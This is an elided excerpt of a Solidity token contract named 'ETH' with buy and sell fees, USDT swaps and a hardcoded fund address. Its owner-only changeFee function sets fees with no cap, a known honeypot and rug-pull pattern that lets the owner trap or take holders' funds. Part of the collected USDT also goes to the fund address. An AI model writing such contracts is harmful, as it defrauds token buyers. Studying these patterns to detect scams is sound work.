...
contract ETH is ERC20 {
	...
	address private _fundAddress = address(0x92b1739251572e2Bd84f478ff51e76b23436b126);
	address public _poolAddress = address(0x92b1739251572e2Bd84f478ff51e76b23436b126);
    ...
    constructor(address tokenOwner) ERC20("ETH", "ETH") {
	...
	function changeFee(uint256 _buyFee,uint256 _sellFee) public onlyOwner {
		buyFee = _buyFee;
		sellFee = _sellFee;
    }
	uint256 public maxBuyAmount = 10**18;
	function changeMaxBuyAmount(uint256 _maxBuyAmount) public onlyOwner {
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to] || isAddLdx) {
			...
			if(from == uniswapV2Pair){
				...
				require(amount <= maxBuyAmount,"max amount");
        ...
        if (takeFee) {
			_splitOtherToken();
			if(from == uniswapV2Pair){
				super._transfer(from, address(this), amount.div(100).mul(buyFee));
				amount = amount.div(100).mul(100-buyFee);
			}else if(to == uniswapV2Pair){
				super._transfer(from, address(this), amount.div(100).mul(sellFee));
				amount = amount.div(100).mul(100 -sellFee);
			}
	...
	function swapAndLiquifyUsdt() public {
		...
		if(allAmount > 10**19){
			...
			if(allusdtAmount > usdtAmount){
				...
				USDT.transfer(_fundAddress,newUsdtAmount.div(2));
			}
		}
    }
					...
					if(buySize >20){
						for(uint256 i=0;i<20;i++){
							if(startIndex == buySize){
								startIndex = 0;
								usdtPerAmount = USDT.balanceOf(address(this)).div(2);
								break;
							}
	...
	uint256 public usdtPerAmount = 10**18;
	function _splitOtherToken() private {
        uint256 thisAmount = USDT.balanceOf(address(this));
        if(thisAmount >= usdtPerAmount && usdtPerAmount > 10**17){
            _splitOtherTokenSecond(usdtPerAmount);
        }
    }
